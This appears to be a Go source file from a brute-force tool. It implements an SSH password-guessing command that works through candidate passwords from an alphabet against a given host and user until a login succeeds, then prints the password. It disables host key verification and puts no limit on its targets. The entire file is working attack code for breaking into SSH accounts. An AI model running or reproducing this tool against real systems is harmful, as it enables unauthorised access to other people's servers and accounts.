package commands

import (
	"fmt"
	"net"
	"runtime"
	"github.com/ngirot/BruteForce/bruteforce/words"
	"golang.org/x/crypto/ssh"
	"github.com/fatih/color"
)

type SshBruteForceCommand struct {
	name string
}

func (command SshBruteForceCommand) GetName() string {
	return "sshBruteForce"
}

func (command SshBruteForceCommand) String() string {
	return "<Command 'sshBruteForce'>"
}

func (command SshBruteForceCommand) Execute(kill chan bool, args []string) {

	if len(args) < 2 {
		fmt.Fprintln(color.Output, color.RedString("Usage: <address> <user>"))
		return
	}

	address := args[0]
	user := args[1]

	var tries = 0

	var worder = words.NewWorder(words.DefaultAlphabet(), numberOfChans, 0)
	for {
		select {
		case <-kill:
			fmt.Println("Aborted.")
			return
		default:
			var curPwd = worder.Next()
			err := trySSHConnection(address, user, curPwd)
			tries++
			if !err {
				fmt.Printf("Success, your password is: %s\nTook %d tries\n", curPwd, tries)
				return
			}
			if tries%100000 == 0 {
				fmt.Printf("\rTook %d tries without result.", tries)

			}
		}
	}
}

var numberOfChans = runtime.NumCPU()*2 + 1

func trySSHConnection(address string, user string, pass string) (bool) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}

	client,  err := ssh.Dial("tcp", address, config)
	defer func() {
		if client != nil {
			client.Close()
		}
	}()
	return err != nil
}
